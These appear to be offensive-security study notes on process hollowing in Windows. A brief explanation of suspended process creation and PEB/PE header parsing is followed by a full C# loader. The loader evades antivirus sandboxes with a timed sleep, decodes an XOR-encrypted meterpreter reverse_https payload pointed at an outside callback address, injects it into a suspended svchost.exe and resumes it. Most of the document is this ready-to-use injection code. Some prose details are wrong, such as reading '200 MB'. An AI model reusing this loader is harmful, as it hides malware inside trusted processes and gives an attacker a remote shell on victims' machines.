# CREATE_SUSPENDED flag

Create a new process in a suspended state

# CreateProcess

1. Creates a virtual memory space for the new process
2. Allocates the stack along with the TEB and PEB
3. Loads required DLLs and EXE into memory

If we pass `CREATE_SUSPENDED` to `CreateProcess`, the process is halted before it runs the entry point

We need to overwrite the Entry Point with shellcode and resume the execution

We can turn to `ZwQueryInformationProcess` to retrieve information about a process including its PEB address

From the PEB, we can get the base address to parse the PE headers and locate the entry point

For `ZwQueryInformationProcess`, we pass an enum `ProcessBasicInformation` to obtain the PEB of a suspended process

We can find the base address of an executable at offset `0x10` into the PEB

Then we read the PEB address using `ReadProcessMemory` using offset `0x10` 

# Process Hollowing Process

Begin with the base address found

Use `ReadProcessMmeory` to read the first 200 MB of memory

Now we read the `e_lfsnew` at offset `0x30` Offset of the beginning of the PE image base, to the PE header

It is given as Offset `0x80` which identifies the start of the PE header

Now we can read the RVA of entry point at `0x28` which needs to be added to the remote process base address to obtain the absolute virtual memory address of the entry point

# Process Hollowing in C Sharp

#### C# Signature for CreateProcessW API
```csharp
[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION
lpProcessInformation);
 ```

#### C# STARTUPINFO struct
```csharp
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
struct STARTUPINFO
{
     public Int32 cb;
     public IntPtr lpReserved;
     public IntPtr lpDesktop;
     public IntPtr lpTitle;
     public Int32 dwX;
     public Int32 dwY;
     public Int32 dwXSize;
     public Int32 dwYSize;
     public Int32 dwXCountChars;
     public Int32 dwYCountChars;
     public Int32 dwFillAttribute;
     public Int32 dwFlags;
     public Int16 wShowWindow;
     public Int16 cbReserved2;
     public IntPtr lpReserved2;
     public IntPtr hStdInput;
     public IntPtr hStdOutput;
     public IntPtr hStdError;
}
```

#### C# PROCESS_INFORMATION struct
```csharp
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_INFORMATION
{
   public IntPtr hProcess;
   public IntPtr hThread;
   public int dwProcessId;
   public int dwThreadId;
}
```

#### Process Hollowing
```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.100.9.16 LPORT=446 -f csharp --encrypt xor --encrypt-key s
            byte[] buf = new byte[692] {};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'s');
            }

            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
        }
    }
}
```